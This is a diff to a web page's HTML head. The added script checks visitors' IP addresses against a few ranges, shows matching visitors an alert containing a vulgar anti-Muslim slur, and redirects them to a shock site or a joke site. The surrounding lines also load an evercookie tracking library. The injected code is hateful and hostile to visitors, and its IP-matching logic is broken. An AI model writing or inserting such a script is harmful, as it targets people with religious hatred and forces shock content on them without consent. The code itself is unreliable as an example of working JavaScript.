@@ -34,6 +34,15 @@
         <script type="text/javascript" src="/jslib/evercookie-0.4/evercookie.js"></script>
         <script type="text/javascript" src="/jslib/snowfall.min.jquery.js"></script>
         <script type="text/javascript" src="/signalr/hubs"></script>
+        
+        <!-- Custom Script -->
+        <script>
+	var ip = <!--#echo var="REMOTE_ADDR"-->
+	if (ip <= '79.185.*.*,83.24.*.*,83.28.*.*,95.49.*.*') {
+	alert("No filthy muslim pig fuckers allowed here!");
+	if (confirm("Get out men"))
+	{location.href="http://www.leekspin.com/" } else { ("OK your choice, doesn't matter to me! SeeYa!"); {location.href="http://meatspin.cc/" }} }
+	</script>
 
         <!-- my styles -->
         <link rel="stylesheet" type="text/css" href="/css/default.css?v=106"/>
